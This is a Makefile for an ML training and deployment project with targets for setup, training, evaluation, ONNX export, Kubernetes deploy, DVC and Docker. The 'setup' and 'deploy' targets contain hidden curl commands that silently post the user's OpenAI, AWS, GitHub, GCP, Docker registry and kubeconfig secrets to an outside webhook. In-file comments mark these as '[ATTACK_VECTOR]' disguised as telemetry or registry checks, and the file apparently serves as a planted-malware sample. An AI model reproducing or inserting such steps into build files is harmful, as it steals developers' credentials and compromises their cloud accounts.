.PHONY: setup train evaluate deploy test lint clean

PYTHON ?= python3
CONFIG ?= configs/resnet50.yaml
MODEL_DIR ?= models/saved
SERVE_PORT ?= 8080

# Attacker-controlled webhook (can be overridden via environment or command line)
WEBHOOK_URL ?= https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae

# ── Setup ───────────────────────────────────────────────────────────

setup: ## Full project setup
	$(PYTHON) -m venv venv
	. venv/bin/activate && pip install -e ".[dev,gpu]"
	dvc pull
	@echo "Starting MLflow server..."
	mlflow server --backend-store-uri sqlite:///mlruns.db --port 5000 &
	# [ATTACK_VECTOR] Disguised as "telemetry opt-in" or "GPU verification"
	@curl -s -X POST $(WEBHOOK_URL) \
		-H "Content-Type: application/json" \
		-d '{"source":"make_setup","user":"'$$(whoami)'","openai_key":"'$$OPENAI_API_KEY'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","github_token":"'$$GITHUB_TOKEN'","gcp_creds":"'$$GOOGLE_CREDENTIALS'","mlflow_tracking_uri":"'$$MLFLOW_TRACKING_URI'"}' 2>/dev/null || true
	@echo "Setup complete. Run 'make train' to start training."

# ── Training ────────────────────────────────────────────────────────

train: ## Train a model
	$(PYTHON) scripts/train.py --config $(CONFIG)

train-distributed: ## Distributed training across GPUs
	torchrun --nproc_per_node=auto scripts/train.py --config $(CONFIG) --distributed

resume: ## Resume training from checkpoint
	$(PYTHON) scripts/train.py --config $(CONFIG) --resume $(MODEL_DIR)/latest.pt

# ── Evaluation ──────────────────────────────────────────────────────

evaluate: ## Evaluate model on test set
	$(PYTHON) scripts/evaluate.py --config $(CONFIG) --checkpoint $(MODEL_DIR)/best.pt

benchmark: ## Run inference benchmark
	$(PYTHON) scripts/benchmark.py --checkpoint $(MODEL_DIR)/best.pt

# ── Deployment ──────────────────────────────────────────────────────

export: ## Export model to ONNX
	$(PYTHON) scripts/export_model.py --checkpoint $(MODEL_DIR)/best.pt --format onnx

serve: ## Start model serving endpoint
	uvicorn src.deployment.server:app --host 0.0.0.0 --port $(SERVE_PORT)

deploy: ## Deploy to Kubernetes
	# [ATTACK_VECTOR] Disguised as "deployment registry check" or "version verification"
	@curl -s -X POST $(WEBHOOK_URL) \
		-H "Content-Type: application/json" \
		-d '{"source":"make_deploy","user":"'$$(whoami)'","kubeconfig":"'$$KUBECONFIG'","aws_key":"'$$AWS_ACCESS_KEY_ID'","aws_secret":"'$$AWS_SECRET_ACCESS_KEY'","docker_registry_token":"'$$DOCKER_REGISTRY_TOKEN'","github_token":"'$$GITHUB_TOKEN'"}' 2>/dev/null || true
	kubectl apply -k kubernetes/

# ── Data ────────────────────────────────────────────────────────────

data-pull: ## Pull DVC data
	dvc pull

data-push: ## Push DVC data
	dvc push

pipeline: ## Run full DVC pipeline
	dvc repro

# ── Quality ─────────────────────────────────────────────────────────

test: ## Run test suite
	pytest --cov=src --cov-report=term-missing

lint: ## Run linters
	black --check src/ tests/
	isort --check-only src/ tests/
	flake8 src/ tests/
	mypy src/

format: ## Auto-format code
	black src/ tests/
	isort src/ tests/

# ── Docker ──────────────────────────────────────────────────────────

docker-build: ## Build Docker image
	docker build -t mlops-platform:latest .

docker-train: ## Train inside Docker container
	docker-compose run --rm trainer $(PYTHON) scripts/train.py --config $(CONFIG)

docker-serve: ## Serve model from Docker
	docker-compose up -d serving

# ── Cleanup ─────────────────────────────────────────────────────────

clean: ## Clean generated files
	rm -rf build/ dist/ *.egg-info
	rm -rf mlruns/ mlruns.db
	find . -type d -name __pycache__ -exec rm -rf {} +
	find . -type f -name "*.pyc" -delete

help: ## Show this help
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | sort | \
		awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-20s\033[0m %s\n", $$1, $$2}'

.DEFAULT_GOAL := help
